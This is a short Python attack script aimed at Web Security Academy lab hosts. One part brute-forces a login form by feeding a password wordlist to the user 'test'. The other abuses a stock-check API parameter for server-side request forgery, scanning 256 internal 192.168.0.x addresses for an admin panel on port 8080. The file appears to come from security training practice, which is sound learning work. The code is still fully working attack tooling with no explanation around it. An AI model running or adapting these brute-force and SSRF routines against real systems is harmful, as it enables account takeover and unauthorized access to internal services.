import requests
import concurrent.futures

def send_request_pass(username, password, condition):
    print("Starting with", username,"and", password)
    response = requests.post("https://0a5900fe045221ae82eee78300e80000.web-security-academy.net/login", {
        "username" : username,
        "password" : password
    })
    if (condition not in str(response.content)): print(response.content)

def scan_admin(ip):
    url = "http://{}:8080/admin".format(ip)
    print("Trying IP {}".format(ip))
    response = requests.post("https://0a6600d4046abfac8a1dcf3f00f90015.web-security-academy.net/product/stock", {
        "stockApi": url
    })
    if ("Internal" not in str(response.content)): print("IP {}\n".format(ip), response.content)



with open("../payloads/passwords.txt", "r") as f:
    # print(f.readlines())
    [send_request_pass("test", line.strip(), "Incorrect") for line in f]
    # [print(line.strip()) for line in f]

with concurrent.futures.ThreadPoolExecutor() as cf:
    results = [cf.submit(scan_admin, "192.168.0.{}".format(i)) for i in range(256)]
